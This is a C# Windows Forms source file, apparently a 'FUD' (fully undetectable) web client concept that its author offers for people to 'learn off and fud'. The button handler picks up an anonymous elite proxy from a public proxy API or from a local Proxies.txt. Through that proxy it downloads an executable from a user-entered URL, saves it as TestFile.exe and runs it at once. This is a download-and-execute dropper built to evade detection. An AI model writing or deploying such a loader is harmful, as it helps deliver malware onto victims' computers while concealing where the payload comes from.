
/*
 
 Author - 0xWarning
 Github - @0xWarning / https://github.com/0xWarning
 Project - fudWebClientConcept
 Completed - 22/05/2020 
 Summary - Simple application for people to learn off and fud :) https://prnt.sc/10tmkq0

 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace fudWebClient
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        } 

        private void button1_Click(object sender, EventArgs e)
        {
            // Url and Exe encryption are a example.
            if (!checkFile.Checked && !checkDownload.Checked) // Checking Proxy option
            {
                MessageBox.Show("Please select atleast one Proxy option."); // If none checked send message
            }
            else
            {
                WebClient fudWebClient = new WebClient();

                if (checkDownload.Checked == true) // Checking if checkDownload is checked
                {
                    string proxyResult = fudWebClient.DownloadString("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=100&anonymity=elite&ssl=yes&limit=1"); // Download Result
                    fudWebClient.Proxy = new WebProxy(proxyResult); // Pass Result To our webproxy
                }
                else if (checkFile.Checked == true) // Else if checkkFile is checked
                {
                    foreach (var line in System.IO.File.ReadLines(Application.StartupPath + "\\Proxies.txt")) // check proxies.txt
                    {
                       fudWebClient.Proxy = new WebProxy(line); // Pass Result To our webproxy
                    }

                }

                if (!checkRun.Checked && !checkEncUrl.Checked && !checkEncExe.Checked)
                {
                    MessageBox.Show("Please select atleast one option.");
                }
                else
                {
                    fudWebClient.DownloadFile(textBox1.Text, "TestFile.exe");
                    Process.Start(Application.StartupPath + "\\TestFile.exe");
                }
            }
        }

        private void checkFile_CheckedChanged(object sender, EventArgs e)
        {
            if (checkFile.Checked == true)
            {
                checkDownload.Checked = false;
            }
        }

        private void checkDownload_CheckedChanged(object sender, EventArgs e)
        {
            if (checkDownload.Checked == true)
            {
                checkFile.Checked = false;
            }
        }
    }
}
